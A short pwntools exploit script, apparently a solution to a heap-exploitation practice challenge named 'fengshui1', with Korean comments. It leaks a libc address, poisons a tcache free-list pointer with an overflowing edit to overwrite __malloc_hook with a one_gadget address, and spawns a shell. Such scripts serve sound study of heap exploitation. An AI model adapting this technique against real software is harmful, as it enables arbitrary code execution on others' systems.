from pwn import *

p = process("./fengshui1")
e = ELF("./fengshui1")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size):
	p.sendlineafter(b">",b"1")
	p.sendlineafter(b":",str(size).encode())


def delete(idx):
	p.sendlineafter(b">",b"2")
	p.sendlineafter(b":",str(idx).encode())


def edit(idx,data):
	p.sendlineafter(b">",b"3")
	p.sendlineafter(b":",str(idx).encode())
	p.sendlineafter(b":", data)

def show(idx):
	p.sendlineafter(b">",b"4")
	p.sendlineafter(b":",str(idx).encode())
	p.recvuntil(b"Data: ")
	return p.recvn(6)

add(0x10)    # 0
add(0x1000)  # 1
add(0x1000)  # 2
delete(1)
add(0x1000)  # 3

libc_base = u64(show(3)+b"\x00\x00") - 96 - 0x3ebc40
malloc_hook = libc_base + libc.symbols["__malloc_hook"]
og = libc_base + 0x10a2fc # 0x4f2a5 0x4f302 0x10a2fc

add(0x20)    # 4
add(0x20)    # 5
add(0x20)    # 6

delete(6)    # tcachebins : 6
delete(4)    # tcachebins : 6 -> 4

add(0x20)    # 7 : LIFO이므로 4번 영역 재사용
payload = b"A"*0x20                              # 7번(4번)의 데이터 영역
payload += p64(0) + p64(0x31) + b"A"*0x20        # 5번 헤더 + 데이터 영역
payload += p64(0) + p64(0x31) + p64(malloc_hook) # 6번 헤더 + fd(malloc_hook)
edit(7, payload)
add(32)      # 8 : 6번 영역 재사용
gdb.attach(p)
add(32)      # 9 : 6번의 fd 참조하여 __malloc_hook에 할당

edit(9, p64(og)) # 데이터 수정하여 __malloc_hook 위치에 one_gadget 삽입
add(32)      # malloc 호출 -> __malloc_hook 호출 -> one_gadget


p.interactive()